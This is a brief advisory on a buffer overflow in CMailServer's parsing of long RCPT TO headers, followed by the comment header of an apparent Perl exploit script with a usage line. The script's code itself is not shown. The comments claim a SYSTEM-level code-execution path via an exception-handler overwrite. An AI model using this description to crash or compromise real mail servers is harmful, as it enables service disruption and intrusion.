A buffer overflow vulnerability has been reported for CMailServer. The vulnerability exists due to insufficient bounds checking when parsing e-mail headers. Specifically, an overly long RCPT TO e-mail header will cause CMailServer to crash and corrupt sensitive memory.

# ESMTP CMailServer 4.0.2003.03.27 SMTP Service DoS attack
#
# URL: http://www.infowarfare.dk/
# EMAIL: der@infowarfare.dk
# USAGE: sploit.pl <target ip>
#
# Summary:
#
# The problem is a Buffer Overflow in the SMTP protocol, within the
# ESMTP CMailServer, causing the service to shutdown
# It is then where we can actually overwrite the exception handler on the
stack allowing
# A system compromise with code execution running as SYSTEM.

#
# Ive censored some of the source code out. =)

# Solution:
# None at this time
